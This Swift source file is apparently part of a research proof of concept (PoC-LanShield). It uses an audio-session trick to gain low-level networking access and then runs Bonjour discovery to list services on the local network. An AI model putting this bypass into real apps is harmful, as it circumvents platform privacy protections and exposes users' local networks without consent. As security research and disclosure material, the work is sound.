//
//  DataExtractionExploit.swift
//  PoC-LanShield
//
//  Created by Alex - SEEMOO on 20.12.24.
//

import Network
import Foundation
import os
import AVFoundation

class DataExtractionExploit: ObservableObject {
    
    var isRunningTests = false
    @Published var log: String = ""
    
    func startAudioStreamingAndBonjour(service: String) async throws {
        // HLS URL: https://streams.radiomast.io/ref-128k-aaclc-stereo/hls.m3u8
        
        // We need to start an HLS stream to get access to low level APIs, like NWBrowser
        
        try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, policy: .longFormAudio)
        log += "Starting audio session"
        os_log("Starting audio session")
        try await withCheckedThrowingContinuation { (checkedContinuation: CheckedContinuation<Void, any Error>) in
            AVAudioSession.sharedInstance().activate { active, error in
                
                if let error {
                    os_log("Audio session failed: \(error)")
                    checkedContinuation.resume(throwing: error)
                    return
                }
                
                Task {
                    os_log("Audio session activated")
                    // Now we can retrieve low-level networking. We don't actually need to start a playback.
                    await self.runBonjourServiceDiscovery(serviceType: service)
                    do {
                        try AVAudioSession.sharedInstance().setActive(false)
                    }catch {
                        checkedContinuation.resume(throwing: error)
                        return
                    }
                    checkedContinuation.resume()
                }
            }
        }
        
    }
    
    func runBonjourServiceDiscovery(serviceType: String) async {
        
        let browser = NWBrowser(for: .bonjour(type: serviceType, domain: nil), using: .tcp)
        os_log("Starting bonjour browser for %@", serviceType)
        
        
        browser.browseResultsChangedHandler = { (newResults, change) in
            DispatchQueue.main.async {[weak self] in
                guard let self else {return}
                
                let serviceDescriptions = newResults.map { result in
                    switch result.endpoint {
                    case .service(name: let name, type: let type, domain: let domain, interface: let interface):
                        "Service: \(name), \(type), \(domain), \(interface?.name ?? "")"
                    case .hostPort(host: let host, port: let port):
                        "Host: \(host.debugDescription), Port: \(port.rawValue)"
                    case .unix(path: let path):
                        "Unix path: \(path)"
                    case .url(let url):
                        "URL: \(url)"
                    case .opaque(let endpoint):
                        "Opaque"
                    default:
                        "Uknown response"
                    }
                }
                
                os_log(.debug, "Discovered services: %@", newResults.description)
                
                self.log += "\n" + serviceDescriptions.joined(separator: "\n")
            }
        }
        
        browser.stateUpdateHandler = { browserState in
            DispatchQueue.main.async {
                var errorString: String? = nil
                switch browserState {
                case .failed(let error):
                    self.isRunningTests = false
                    errorString = error.debugDescription
                case .cancelled:
                    self.isRunningTests = false
                case .ready:
                    self.isRunningTests = true
                case .setup:
                    self.isRunningTests = false
                case .waiting(let error):
                    self.isRunningTests = false
                    errorString = error.debugDescription
                @unknown default:
                    self.isRunningTests = false
                    errorString = "Unknown error"
                }
                
                os_log(.info, "Browser state is %@", String(describing: browserState))
                
                if let errorString {
                    os_log(.error, "Bonjour error: %@", errorString)
                    
                }
            }
            
        }
        
        browser.start(queue: .global(qos: .userInitiated))
        
        do {
            try await Task.sleep(for: .seconds(20))
            browser.cancel()
        }catch {
            browser.cancel()
            log += "\nError: \(error)"
        }
    }
}
